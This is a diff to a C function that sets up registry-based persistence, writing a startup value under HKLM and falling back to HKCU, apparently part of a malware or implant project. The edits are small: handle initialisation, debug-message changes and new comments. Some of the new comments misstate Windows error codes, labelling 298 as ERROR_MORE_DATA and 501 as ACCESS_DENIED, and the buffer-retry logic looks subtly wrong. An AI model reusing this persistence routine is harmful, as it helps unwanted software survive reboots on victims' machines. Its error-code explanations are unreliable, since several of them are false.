@@ -1,7 +1,7 @@
 #include "../include/config.h"
 
 BOOL RegisterPersistence(void) {
-    HKEY hKey;
+    HKEY hKey = NULL;  // Initialize hKey to NULL
     LONG ret;
 
     printf("[DEBUG] RegisterPersistence: Trying HKLM...\n");
@@ -19,7 +19,7 @@ BOOL RegisterPersistence(void) {
         
         printf("[DEBUG] Value name: %ls\n", PERSIST_VAL_NAME);
         printf("[DEBUG] Value data: %ls\n", testData);
-        printf("[DEBUG] Calculated length: %lu bytes (%zu wchar_t chars)\n", (unsigned long)dataLen, wcslen(testData));
+        printf("[DEBUG] Calculated length: %lu bytes\n", (unsigned long)dataLen);
         fflush(stdout);
         
         // Retry logic: If ERROR_MORE_DATA, retry with larger buffer
@@ -37,7 +37,7 @@ BOOL RegisterPersistence(void) {
                 return TRUE;
             }
             else if (ret == 0x8000000A || ret == 0x8007000A) {
-                // ERROR_MORE_DATA - try with LARGER buffer
+                // ERROR_MORE_DATA - try with larger buffer
                 printf("[DEBUG] Buffer size error (0x%08X), retrying with larger buffer...\n", ret);
                 dataLen = ((wcslen(testData) + 1) * sizeof(wchar_t)) + 4096;
                 ret = RegSetValueExW(hKey, PERSIST_VAL_NAME, 0, REG_SZ, 
@@ -58,8 +58,10 @@ BOOL RegisterPersistence(void) {
         printf("[DEBUG] HKLM opened failed: 0x%08X\n", (DWORD)ret);
         DWORD err = GetLastError();
         printf("[DEBUG] HKLM Last Error: 0x%08X\n", err);
-        fflush(stdout);
         
+        // Error 298 = ERROR_MORE_DATA (usually means buffer size issue)
+        // Error 5 = ACCESS_DENIED (might need to use HKCU)
+        // Error 501 = ERROR_ACCESS_DENIED
         if (err == 5 || err == 501) {
             printf("[DEBUG] HKLM Access Denied, trying HKCU...\n");
             fflush(stdout);
@@ -76,6 +78,7 @@ BOOL RegisterPersistence(void) {
         printf("[DEBUG] HKCU opened successfully (Handle: %p)\n", (void*)hKey);
         fflush(stdout);
         
+        // Calculate the correct size for wide string
         wchar_t *testData = (wchar_t*)PERSIST_VAL_DATA;
         size_t dataLen = (wcslen(testData) + 1) * sizeof(wchar_t);
         
